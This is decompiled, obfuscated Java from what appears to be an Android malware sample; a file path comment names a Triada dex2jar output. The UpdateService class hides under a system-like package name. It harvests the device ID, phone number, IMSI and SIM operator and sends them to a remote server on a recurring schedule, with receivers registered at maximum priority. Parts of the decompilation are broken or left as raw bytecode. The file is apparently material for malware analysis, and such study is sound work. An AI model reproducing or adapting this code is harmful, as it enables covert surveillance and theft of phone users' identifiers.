package com.android.jservice;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.a.a.a.a;
import com.a.a.a.b;
import com.a.a.a.c;
import com.a.a.a.d;
import com.a.a.a.e;
import com.a.a.b.a;
import com.a.a.b.c;
import com.a.a.c.c;
import com.android.xb.start.start;
import java.io.File;
import java.util.ArrayList;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

@SuppressLint({"HandlerLeak"})
public class UpdateService extends Service implements Handler.Callback {
  public static String a = null;
  
  public static Handler b;
  
  public static String c = c.b(a.O);
  
  public static UpdateService d;
  
  public static String e;
  
  private static boolean j;
  
  private static boolean k;
  
  private static String u = d.b;
  
  private static String v = d.b;
  
  private boolean f;
  
  private ArrayList g = new ArrayList();
  
  private a h;
  
  private SharedPreferences i;
  
  private a l;
  
  private TelephonyManager m;
  
  private JSONObject n;
  
  private int o;
  
  private int p;
  
  private boolean q;
  
  private boolean r;
  
  private int s;
  
  private long t;
  
  private int w;
  
  private String x = d.b;
  
  static {
    e = d.b;
  }
  
  private void a(Handler paramHandler, Context paramContext) {
    // Byte code:
    //   0: aload_0
    //   1: aload_0
    //   2: invokevirtual a : ()Lorg/json/JSONObject;
    //   5: putfield n : Lorg/json/JSONObject;
    //   8: getstatic com/android/jservice/UpdateService.b : Landroid/os/Handler;
    //   11: iconst_2
    //   12: invokevirtual removeMessages : (I)V
    //   15: new org/json/JSONObject
    //   18: dup
    //   19: invokespecial <init> : ()V
    //   22: astore_3
    //   23: invokestatic f : ()V
    //   26: aload_3
    //   27: getstatic com/a/a/a/b.B : Ljava/lang/String;
    //   30: getstatic com/android/jservice/UpdateService.e : Ljava/lang/String;
    //   33: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   36: pop
    //   37: aload_3
    //   38: getstatic com/a/a/a/b.C : Ljava/lang/String;
    //   41: getstatic com/android/jservice/UpdateService.u : Ljava/lang/String;
    //   44: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   47: pop
    //   48: aload_3
    //   49: getstatic com/a/a/a/b.D : Ljava/lang/String;
    //   52: getstatic com/android/jservice/UpdateService.v : Ljava/lang/String;
    //   55: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   58: pop
    //   59: aload_3
    //   60: getstatic com/a/a/a/b.E : Ljava/lang/String;
    //   63: iconst_0
    //   64: invokevirtual put : (Ljava/lang/String;I)Lorg/json/JSONObject;
    //   67: pop
    //   68: aload_3
    //   69: getstatic com/a/a/a/b.M : Ljava/lang/String;
    //   72: aload_0
    //   73: getfield i : Landroid/content/SharedPreferences;
    //   76: getstatic com/a/a/a/b.w : Ljava/lang/String;
    //   79: ldc ''
    //   81: invokeinterface getString : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   86: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   89: pop
    //   90: aload_3
    //   91: getstatic com/a/a/a/b.F : Ljava/lang/String;
    //   94: getstatic com/a/a/a/d.b : Ljava/lang/String;
    //   97: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   100: pop
    //   101: aload_0
    //   102: invokespecial c : ()V
    //   105: aload_0
    //   106: invokespecial d : ()V
    //   109: aload_0
    //   110: invokespecial e : ()V
    //   113: invokestatic currentTimeMillis : ()J
    //   116: aload_0
    //   117: getfield t : J
    //   120: lsub
    //   121: ldc2_w 1000
    //   124: ldiv
    //   125: ldc2_w 60
    //   128: ldiv
    //   129: l2i
    //   130: istore #4
    //   132: aload_0
    //   133: invokestatic a : (Landroid/content/Context;)Z
    //   136: ifne -> 154
    //   139: aload_0
    //   140: invokespecial h : ()V
    //   143: return
    //   144: astore #5
    //   146: aload #5
    //   148: invokevirtual printStackTrace : ()V
    //   151: goto -> 101
    //   154: aload_0
    //   155: getfield r : Z
    //   158: ifeq -> 280
    //   161: iload #4
    //   163: iconst_2
    //   164: if_icmplt -> 254
    //   167: aload_0
    //   168: iconst_0
    //   169: putfield r : Z
    //   172: aload_0
    //   173: getfield l : Lcom/a/a/b/a;
    //   176: aload_2
    //   177: aload_1
    //   178: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   181: aload_0
    //   182: getfield l : Lcom/a/a/b/a;
    //   185: new com/a/a/b/c
    //   188: dup
    //   189: new java/lang/StringBuilder
    //   192: dup
    //   193: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   196: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   199: invokespecial <init> : (Ljava/lang/String;)V
    //   202: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   205: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   208: invokevirtual toString : ()Ljava/lang/String;
    //   211: iconst_3
    //   212: iconst_0
    //   213: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   216: aload_1
    //   217: aload_3
    //   218: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   221: aload_0
    //   222: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   225: iconst_0
    //   226: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   229: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   234: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   237: invokestatic currentTimeMillis : ()J
    //   240: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   245: invokeinterface commit : ()Z
    //   250: pop
    //   251: goto -> 143
    //   254: aload_2
    //   255: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   258: invokestatic currentTimeMillis : ()J
    //   261: iconst_3
    //   262: iload #4
    //   264: isub
    //   265: bipush #60
    //   267: imul
    //   268: sipush #1000
    //   271: imul
    //   272: i2l
    //   273: ladd
    //   274: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   277: goto -> 143
    //   280: aload_0
    //   281: getfield q : Z
    //   284: ifeq -> 408
    //   287: iload #4
    //   289: bipush #29
    //   291: if_icmple -> 381
    //   294: aload_0
    //   295: iconst_0
    //   296: putfield q : Z
    //   299: aload_0
    //   300: getfield l : Lcom/a/a/b/a;
    //   303: aload_2
    //   304: aload_1
    //   305: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   308: aload_0
    //   309: getfield l : Lcom/a/a/b/a;
    //   312: new com/a/a/b/c
    //   315: dup
    //   316: new java/lang/StringBuilder
    //   319: dup
    //   320: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   323: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   326: invokespecial <init> : (Ljava/lang/String;)V
    //   329: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   332: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   335: invokevirtual toString : ()Ljava/lang/String;
    //   338: iconst_3
    //   339: iconst_0
    //   340: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   343: aload_1
    //   344: aload_3
    //   345: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   348: aload_0
    //   349: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   352: iconst_0
    //   353: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   356: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   361: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   364: invokestatic currentTimeMillis : ()J
    //   367: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   372: invokeinterface commit : ()Z
    //   377: pop
    //   378: goto -> 143
    //   381: aload_2
    //   382: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   385: invokestatic currentTimeMillis : ()J
    //   388: bipush #30
    //   390: iload #4
    //   392: isub
    //   393: bipush #60
    //   395: imul
    //   396: sipush #1000
    //   399: imul
    //   400: i2l
    //   401: ladd
    //   402: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   405: goto -> 143
    //   408: aload_0
    //   409: getfield s : I
    //   412: iconst_1
    //   413: if_icmpne -> 575
    //   416: iload #4
    //   418: sipush #359
    //   421: if_icmplt -> 520
    //   424: aload_0
    //   425: getfield l : Lcom/a/a/b/a;
    //   428: aload_2
    //   429: aload_1
    //   430: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   433: aload_0
    //   434: getfield l : Lcom/a/a/b/a;
    //   437: new com/a/a/b/c
    //   440: dup
    //   441: new java/lang/StringBuilder
    //   444: dup
    //   445: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   448: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   451: invokespecial <init> : (Ljava/lang/String;)V
    //   454: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   457: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   460: invokevirtual toString : ()Ljava/lang/String;
    //   463: iconst_3
    //   464: iconst_0
    //   465: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   468: aload_1
    //   469: aload_3
    //   470: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   473: aload_2
    //   474: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   477: invokestatic currentTimeMillis : ()J
    //   480: ldc2_w 1800000
    //   483: ladd
    //   484: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   487: aload_0
    //   488: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   491: iconst_0
    //   492: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   495: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   500: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   503: invokestatic currentTimeMillis : ()J
    //   506: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   511: invokeinterface commit : ()Z
    //   516: pop
    //   517: goto -> 143
    //   520: iload #4
    //   522: sipush #330
    //   525: if_icmplt -> 558
    //   528: aload_2
    //   529: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   532: invokestatic currentTimeMillis : ()J
    //   535: bipush #30
    //   537: iload #4
    //   539: bipush #30
    //   541: irem
    //   542: isub
    //   543: bipush #60
    //   545: imul
    //   546: sipush #1000
    //   549: imul
    //   550: i2l
    //   551: ladd
    //   552: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   555: goto -> 143
    //   558: aload_2
    //   559: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   562: invokestatic currentTimeMillis : ()J
    //   565: ldc2_w 1800000
    //   568: ladd
    //   569: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   572: goto -> 143
    //   575: aload_0
    //   576: getfield w : I
    //   579: iconst_1
    //   580: if_icmpne -> 742
    //   583: iload #4
    //   585: sipush #179
    //   588: if_icmplt -> 687
    //   591: aload_0
    //   592: getfield l : Lcom/a/a/b/a;
    //   595: aload_2
    //   596: aload_1
    //   597: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   600: aload_0
    //   601: getfield l : Lcom/a/a/b/a;
    //   604: new com/a/a/b/c
    //   607: dup
    //   608: new java/lang/StringBuilder
    //   611: dup
    //   612: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   615: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   618: invokespecial <init> : (Ljava/lang/String;)V
    //   621: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   624: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   627: invokevirtual toString : ()Ljava/lang/String;
    //   630: iconst_3
    //   631: iconst_0
    //   632: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   635: aload_1
    //   636: aload_3
    //   637: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   640: aload_2
    //   641: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   644: invokestatic currentTimeMillis : ()J
    //   647: ldc2_w 1800000
    //   650: ladd
    //   651: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   654: aload_0
    //   655: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   658: iconst_0
    //   659: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   662: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   667: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   670: invokestatic currentTimeMillis : ()J
    //   673: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   678: invokeinterface commit : ()Z
    //   683: pop
    //   684: goto -> 143
    //   687: iload #4
    //   689: sipush #150
    //   692: if_icmplt -> 725
    //   695: aload_2
    //   696: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   699: invokestatic currentTimeMillis : ()J
    //   702: bipush #30
    //   704: iload #4
    //   706: bipush #30
    //   708: irem
    //   709: isub
    //   710: bipush #60
    //   712: imul
    //   713: sipush #1000
    //   716: imul
    //   717: i2l
    //   718: ladd
    //   719: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   722: goto -> 143
    //   725: aload_2
    //   726: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   729: invokestatic currentTimeMillis : ()J
    //   732: ldc2_w 1800000
    //   735: ladd
    //   736: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   739: goto -> 143
    //   742: aload_0
    //   743: getfield p : I
    //   746: iconst_1
    //   747: if_icmple -> 919
    //   750: iload #4
    //   752: bipush #29
    //   754: if_icmple -> 868
    //   757: aload_0
    //   758: getfield l : Lcom/a/a/b/a;
    //   761: aload_2
    //   762: aload_1
    //   763: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   766: aload_0
    //   767: getfield l : Lcom/a/a/b/a;
    //   770: new com/a/a/b/c
    //   773: dup
    //   774: new java/lang/StringBuilder
    //   777: dup
    //   778: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   781: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   784: invokespecial <init> : (Ljava/lang/String;)V
    //   787: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   790: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   793: invokevirtual toString : ()Ljava/lang/String;
    //   796: iconst_3
    //   797: iconst_0
    //   798: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   801: aload_1
    //   802: aload_3
    //   803: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   806: aload_2
    //   807: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   810: invokestatic currentTimeMillis : ()J
    //   813: ldc2_w 1800000
    //   816: ladd
    //   817: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   820: aload_0
    //   821: getfield i : Landroid/content/SharedPreferences;
    //   824: ifnonnull -> 839
    //   827: aload_0
    //   828: aload_0
    //   829: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   832: iconst_0
    //   833: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   836: putfield i : Landroid/content/SharedPreferences;
    //   839: aload_0
    //   840: getfield i : Landroid/content/SharedPreferences;
    //   843: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   848: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   851: invokestatic currentTimeMillis : ()J
    //   854: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   859: invokeinterface commit : ()Z
    //   864: pop
    //   865: goto -> 143
    //   868: getstatic com/android/jservice/UpdateService.j : Z
    //   871: ifeq -> 892
    //   874: getstatic com/android/jservice/UpdateService.b : Landroid/os/Handler;
    //   877: getstatic com/android/jservice/UpdateService.b : Landroid/os/Handler;
    //   880: bipush #8
    //   882: invokevirtual obtainMessage : (I)Landroid/os/Message;
    //   885: ldc2_w 60000
    //   888: invokevirtual sendMessageDelayed : (Landroid/os/Message;J)Z
    //   891: pop
    //   892: aload_2
    //   893: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   896: invokestatic currentTimeMillis : ()J
    //   899: bipush #30
    //   901: iload #4
    //   903: isub
    //   904: bipush #60
    //   906: imul
    //   907: sipush #1000
    //   910: imul
    //   911: i2l
    //   912: ladd
    //   913: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   916: goto -> 143
    //   919: iload #4
    //   921: bipush #59
    //   923: if_icmplt -> 1037
    //   926: aload_0
    //   927: getfield l : Lcom/a/a/b/a;
    //   930: aload_2
    //   931: aload_1
    //   932: invokevirtual a : (Landroid/content/Context;Landroid/os/Handler;)V
    //   935: aload_0
    //   936: getfield l : Lcom/a/a/b/a;
    //   939: new com/a/a/b/c
    //   942: dup
    //   943: new java/lang/StringBuilder
    //   946: dup
    //   947: getstatic com/a/a/a/b.d : Ljava/lang/String;
    //   950: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   953: invokespecial <init> : (Ljava/lang/String;)V
    //   956: getstatic com/a/a/a/b.j : Ljava/lang/String;
    //   959: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   962: invokevirtual toString : ()Ljava/lang/String;
    //   965: iconst_3
    //   966: iconst_0
    //   967: invokespecial <init> : (Ljava/lang/String;IZ)V
    //   970: aload_1
    //   971: aload_3
    //   972: invokevirtual a : (Lcom/a/a/b/c;Landroid/os/Handler;Lorg/json/JSONObject;)V
    //   975: aload_2
    //   976: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   979: invokestatic currentTimeMillis : ()J
    //   982: ldc2_w 1800000
    //   985: ladd
    //   986: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   989: aload_0
    //   990: getfield i : Landroid/content/SharedPreferences;
    //   993: ifnonnull -> 1008
    //   996: aload_0
    //   997: aload_0
    //   998: getstatic com/a/a/a/b.Q : Ljava/lang/String;
    //   1001: iconst_0
    //   1002: invokevirtual getSharedPreferences : (Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   1005: putfield i : Landroid/content/SharedPreferences;
    //   1008: aload_0
    //   1009: getfield i : Landroid/content/SharedPreferences;
    //   1012: invokeinterface edit : ()Landroid/content/SharedPreferences$Editor;
    //   1017: getstatic com/a/a/a/b.V : Ljava/lang/String;
    //   1020: invokestatic currentTimeMillis : ()J
    //   1023: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
    //   1028: invokeinterface commit : ()Z
    //   1033: pop
    //   1034: goto -> 143
    //   1037: getstatic com/android/jservice/UpdateService.j : Z
    //   1040: ifeq -> 1061
    //   1043: getstatic com/android/jservice/UpdateService.b : Landroid/os/Handler;
    //   1046: getstatic com/android/jservice/UpdateService.b : Landroid/os/Handler;
    //   1049: bipush #8
    //   1051: invokevirtual obtainMessage : (I)Landroid/os/Message;
    //   1054: ldc2_w 60000
    //   1057: invokevirtual sendMessageDelayed : (Landroid/os/Message;J)Z
    //   1060: pop
    //   1061: iload #4
    //   1063: bipush #30
    //   1065: if_icmplt -> 1095
    //   1068: aload_2
    //   1069: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   1072: invokestatic currentTimeMillis : ()J
    //   1075: bipush #60
    //   1077: iload #4
    //   1079: isub
    //   1080: bipush #60
    //   1082: imul
    //   1083: sipush #1000
    //   1086: imul
    //   1087: i2l
    //   1088: ladd
    //   1089: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   1092: goto -> 143
    //   1095: aload_2
    //   1096: getstatic com/a/a/a/b.n : Ljava/lang/String;
    //   1099: invokestatic currentTimeMillis : ()J
    //   1102: bipush #60
    //   1104: iload #4
    //   1106: isub
    //   1107: bipush #30
    //   1109: imul
    //   1110: sipush #1000
    //   1113: imul
    //   1114: i2l
    //   1115: ladd
    //   1116: invokestatic a : (Landroid/content/Context;Ljava/lang/String;J)V
    //   1119: goto -> 143
    // Exception table:
    //   from	to	target	type
    //   26	101	144	org/json/JSONException
  }
  
  private void a(String paramString) {
    String str = c.a(String.valueOf(b.c) + File.separator + paramString + b.v);
    this.g.clear();
    try {
      JSONArray jSONArray = new JSONArray();
      this(str);
      int i = jSONArray.length();
      byte b = 0;
      label20: while (true) {
        c c;
        if (b >= i) {
          if (this.g.size() > 0) {
            c = this.g.remove(0);
            c.a((Context)this, c.a, c.b, c);
          } 
          return;
        } 
        JSONObject jSONObject = c.getJSONObject(b);
        if (jSONObject.getString(b.X).equals(String.valueOf(0))) {
          c c1 = new c();
          this();
          int j = jSONObject.getInt(b.Z);
          c1.a = jSONObject.getString(b.t);
          c1.b = jSONObject.getString(b.Y);
          for (byte b1 = 0;; b1++) {
            if (b1 >= j) {
              b++;
              continue label20;
            } 
            this.g.add(c1);
          } 
          break;
        } 
        continue;
      } 
    } catch (JSONException jSONException) {}
  }
  
  private void c() {
    if (this.i == null)
      this.i = getSharedPreferences(b.Q, 0); 
    this.t = this.i.getLong(b.V, 0L);
  }
  
  private void d() {
    if (this.i == null)
      this.i = getSharedPreferences(b.Q, 0); 
    this.w = this.i.getInt(b.W, 0);
  }
  
  private void e() {
    if (this.i == null)
      this.i = getSharedPreferences(b.Q, 0); 
    this.s = this.i.getInt(b.U, 0);
  }
  
  private static void f() {
    if (u == null || u.equals(d.b) || v == null || v.equals(d.b)) {
      u = b.x;
      v = b.y;
    } 
  }
  
  private void g() {
    if (this.i == null)
      this.i = getSharedPreferences(b.Q, 0); 
    if (a.a((Context)this)) {
      this.n = a();
      if (this.f) {
        this.f = false;
        b.sendEmptyMessage(0);
        return;
      } 
      b.sendEmptyMessage(2);
      return;
    } 
    h();
  }
  
  private void h() {
    this.o = 1;
    j = true;
    a.a();
    a.a((Context)this, true);
    a.a();
    a.b((Context)this, false);
  }
  
  public final JSONObject a() {
    JSONObject jSONObject = new JSONObject();
    this.x = this.m.getDeviceId();
    String str1 = this.m.getLine1Number();
    String str2 = str1;
    if (str1 == null)
      str2 = d.b; 
    str1 = this.m.getSubscriberId();
    e = str1;
    if (TextUtils.isEmpty(str1))
      e = ""; 
    str1 = this.m.getSimOperatorName();
    f();
    try {
      jSONObject.put(b.C, u);
      jSONObject.put(b.D, v);
      jSONObject.put(b.B, e);
      jSONObject.put(b.S, str2);
      jSONObject.put(b.T, this.x);
      jSONObject.put(b.R, str1);
    } catch (JSONException jSONException) {
      jSONException.printStackTrace();
    } 
    return jSONObject;
  }
  
  public boolean handleMessage(Message paramMessage) {
    Handler handler;
    c c;
    String str4;
    StringBuffer stringBuffer;
    switch (paramMessage.what) {
      default:
        return false;
      case 0:
        b.removeMessages(0);
        this.n = a();
        this.f = true;
        handler = b;
        if (!a.a(getApplicationContext()))
          if (k)
            h();  
        this.l.a(new c(String.valueOf(b.d) + b.i, 1, false), handler, this.n);
      case 1:
        if (c.a((Context)this, (Message)handler) == 0) {
          this.r = false;
          a(b, (Context)this);
        } 
        this.r = true;
      case 2:
        a(b, (Context)this);
      case 3:
        str2 = String.valueOf(System.currentTimeMillis()) + d.b;
        str3 = b.m;
        str4 = b.k;
        c.a(str2, str3, null);
        this.n = a();
        this.q = false;
        this.r = false;
        this.p = c.a((Context)this, b, (Message)handler);
      case 4:
        a(a);
      case 5:
        b.a(getApplicationContext());
        c.a((Context)this, b);
      case 6:
        g();
      case 7:
        if (((Message)handler).arg1 == 110) {
          str2 = c.a((Context)this, b.k, b.l);
          if (str2.equals(d.b)) {
            str3 = String.valueOf(System.currentTimeMillis()) + b.L;
            str2 = b.l;
            String str = b.k;
            c.a(str3, str2, null);
          } 
          str1 = str2.substring(0, str2.indexOf(b.L));
          str2 = str2.substring(str2.indexOf(b.L) + 1, str2.length());
          if (str1.equals(String.valueOf(0))) {
            str2 = String.valueOf(System.currentTimeMillis()) + b.L + str2;
            str3 = b.l;
            str1 = b.k;
            c.a(str2, str3, null);
          } 
        } 
        this.q = true;
        if (this.i == null)
          this.i = getSharedPreferences(b.Q, 0); 
        this.i.edit().putLong(b.V, System.currentTimeMillis()).commit();
        a(b, (Context)this);
      case -1:
        if (this.g.size() > 0) {
          c = this.g.remove(0);
          c.a((Context)this, c.a, c.b, c);
        } 
      case 110:
        break;
    } 
    try {
      JSONObject jSONObject = (JSONObject)((Message)c).obj;
      str2 = jSONObject.getString(b.G);
      str3 = jSONObject.getString(b.H);
      str1 = jSONObject.getString(b.I);
      str4 = jSONObject.getString(b.J);
      String str = c.a((Context)this, b.k, b.l);
      if (str.equals(d.b)) {
        if (!str2.equals(b.d) || !str3.equals(b.e) || !str1.equals(b.f) || !str4.equals(b.g)) {
          stringBuffer = new StringBuffer();
          this();
          stringBuffer.append(b.K).append(str2).append(b.L).append(str3).append(b.L).append(str1).append(b.L).append(str4);
          str3 = stringBuffer.toString();
          str1 = b.l;
          str2 = b.k;
          c.a(str3, str1, null);
        } 
        str2 = b.K;
        str3 = b.l;
        str1 = b.k;
        c.a(str2, str3, null);
      } 
    } catch (Exception exception) {}
    if ((stringBuffer.split(b.L)).length >= 2) {
      stringBuffer = new StringBuffer();
      this();
      stringBuffer.append(b.K).append(str2).append(b.L).append(str3).append(b.L).append((String)exception).append(b.L).append(str4);
      str2 = stringBuffer.toString();
      str1 = b.l;
      str3 = b.k;
      c.a(str2, str1, null);
    } 
    if (!str2.equals(b.d) || !str3.equals(b.e) || !str1.equals(b.f) || !str4.equals(b.g)) {
      stringBuffer = new StringBuffer();
      this();
      stringBuffer.append(b.K).append(str2).append(b.L).append(str3).append(b.L).append(str1).append(b.L).append(str4);
      str3 = stringBuffer.toString();
      str2 = b.l;
      str1 = b.k;
      c.a(str3, str2, null);
    } 
    String str1 = b.K;
    String str2 = b.l;
    String str3 = b.k;
    c.a(str1, str2, null);
  }
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public void onCreate() {
    super.onCreate();
    d = this;
    if (!a.a((Context)this))
      h(); 
    start.init((Context)this);
    f();
    d();
    e();
    c();
    this.h = new a(this, (byte)0);
    IntentFilter intentFilter = new IntentFilter();
    intentFilter.setPriority(2147483647);
    intentFilter.addAction(b.am);
    intentFilter.addAction(b.an);
    intentFilter.addAction(c);
    intentFilter.addAction(b.ao);
    registerReceiver(this.h, intentFilter);
    intentFilter = new IntentFilter(b.as);
    intentFilter.setPriority(2147483647);
    registerReceiver(new PopReceiver(), intentFilter);
    e e = new e((Context)this, new Handler());
    getContentResolver().registerContentObserver(Uri.parse(b.ai), true, (ContentObserver)e);
    j = false;
    this.m = (TelephonyManager)getSystemService(b.ap);
  }
  
  public void onDestroy() {
    unregisterReceiver(this.h);
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    String str;
    if (c.a()) {
      b.c = String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + b.a + getPackageName() + b.b;
    } else {
      b.c = getCacheDir().getPath();
    } 
    File file = new File(String.valueOf(b.c) + File.separator);
    if (!file.exists())
      file.mkdirs(); 
    if (b == null)
      b = new Handler(this); 
    this.l = a.a();
    c();
    if (System.currentTimeMillis() - this.t > 599998L)
      b.sendEmptyMessage(5); 
    if (paramIntent != null) {
      str = paramIntent.getAction();
      if (str != null) {
        if (str.equals(b.n)) {
          b.sendEmptyMessage(2);
          return super.onStartCommand(paramIntent, 1, paramInt2);
        } 
      } else {
        return super.onStartCommand(paramIntent, 1, paramInt2);
      } 
    } else {
      return super.onStartCommand(paramIntent, 1, paramInt2);
    } 
    if (str.equals(b.o))
      b.sendEmptyMessage(-1); 
    return super.onStartCommand(paramIntent, 1, paramInt2);
  }
  
  static {
    String str = d.b;
    str = d.b;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/jservice/UpdateService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */